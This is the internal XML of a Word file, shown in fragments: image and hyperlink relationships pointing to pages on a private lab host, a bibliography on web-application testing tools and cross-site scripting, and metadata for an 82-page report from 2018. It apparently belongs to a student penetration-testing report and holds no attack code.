Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image62.png"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image83.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192.168.1.10/contact.php" TargetMode="External"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.png"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image78.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Aboruc@gmail.com" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398843877" TargetMode="External"/><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image" Target="media/image52.png"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image73.png"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/profile.php" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398838737" TargetMode="External"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image68.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer1.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/insertCustomer.php" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com" TargetMode="External"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image26.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image340.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3.png"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image84.png"/><Relationship Id="rId148"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hyperlink" Target="mailto:Aboruc@gmail.com" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/phpinfo.php" TargetMode="External"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Aboruc@gmail.com" TargetMode="External"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.png"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.10/userValidate.php" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:15398838897" TargetMode="External"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.png"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image44.png"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image64.png"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8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mg\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Daf</b:Tag>
    <b:SourceType>Book</b:SourceType>
    <b:Guid>{87F92A8B-58CD-44BE-A483-42EB789730F1}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Pinto</b:Last>
            <b:First>Dafydd</b:First>
            <b:Middle>Studdard and Marcus</b:Middle>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:RefOrder>2</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Wik</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{B01EA637-B258-4FF0-9802-F47B62EE3D78}</b:Guid>
    <b:Title>Wikipedia - Cross-Site Scripting</b:Title>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>Wikipediea</b:Last>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:URL>https://en.wikipedia.org/wiki/Cross-site_scripting#Exploit_examples</b:URL>
    <b:RefOrder>3</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>OWA</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{58915F2F-FD68-4FEB-A90C-A5C894EA5301}</b:Guid>
    <b:Title>OWASP-Zap</b:Title>
    <b:URL>https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</b:URL>
    <b:RefOrder>4</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Bur</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{C70D8B36-C33C-42DA-AA4B-608857B9BB0C}</b:Guid>
    <b:Title>Burp Suite</b:Title>
    <b:URL>https://portswigger.net/burp</b:URL>
    <b:RefOrder>5</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>OWA1</b:Tag>
    <b:SourceType>InternetSite</b:SourceType>
    <b:Guid>{8B112C92-AADC-4A4D-9AD5-2564557CA3CC}</b:Guid>
    <b:Author>
      <b:Author>
        <b:NameList>
          <b:Person>
            <b:Last>OWASP</b:Last>
          </b:Person>
        </b:NameList>
      </b:Author>
    </b:Author>
    <b:Title>Dirbuster</b:Title>
    <b:URL>https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project</b:URL>
    <b:RefOrder>1</b:RefOrder>
  </b:Source>
  <b:Source>
    <b:Tag>Placeholder1</b:Tag>
    <b:SourceType>Book</b:SourceType>
    <b:Guid>{BBA06637-147F-4F0B-BB77-37E213A22DED}</b:Guid>
    <b:RefOrder>6</b:RefOrder>
  </b:Source>
</b:Sources>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E9193976-B02B-7744-93BD-2D07757AD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C:\Users\amg\AppData\Roaming\Microsoft\Templates\Report design (blank).dotx</Template>
  <TotalTime>2818</TotalTime>
  <Pages>82</Pages>
  <Words>15582</Words>
  <Characters>88822</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UAD</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>104196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CONNOR DUNCAN</dc:creator>
  <cp:lastModifiedBy>CONNOR DUNCAN</cp:lastModifiedBy>
  <cp:revision>56</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-11-20T13:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-12-03T23:27:00Z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